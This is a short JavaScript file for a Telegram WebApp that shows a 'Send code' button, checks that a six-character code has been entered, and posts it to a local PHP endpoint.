let tg = window.Telegram.WebApp;
tg.expand();
tg.enableClosingConfirmation();

tg.MainButton.text = "Отправить код";
tg.MainButton.show();
let passwordInput = document.querySelector('input');

document.addEventListener( 'click', (e) => {
	const withinBoundaries = e.composedPath().includes(passwordInput);
	if (! withinBoundaries ) {
		passwordInput.blur();
	} else{
    passwordInput.focus();
  }
});

passwordInput.addEventListener("input", passwordInputHandler);

function passwordInputHandler(){
  if (passwordInput.value.length == 6){
    passwordInput.classList.add('correctInput');
    passwordInput.classList.remove('incorrectInput');
  } else{
    passwordInput.classList.remove('correctInput');
  }
}

tg.MainButton.onClick(function(){
  passwordInput.blur();
  console.log(passwordInput.classList.value);
  if (passwordInput.classList == 'correctInput'){
    fetch("send_msg.php", {
      method: "POST",
      body: password.value
    })
    console.log(password.value);
  }else{
      passwordInput.classList.add('incorrectInput');
  }
});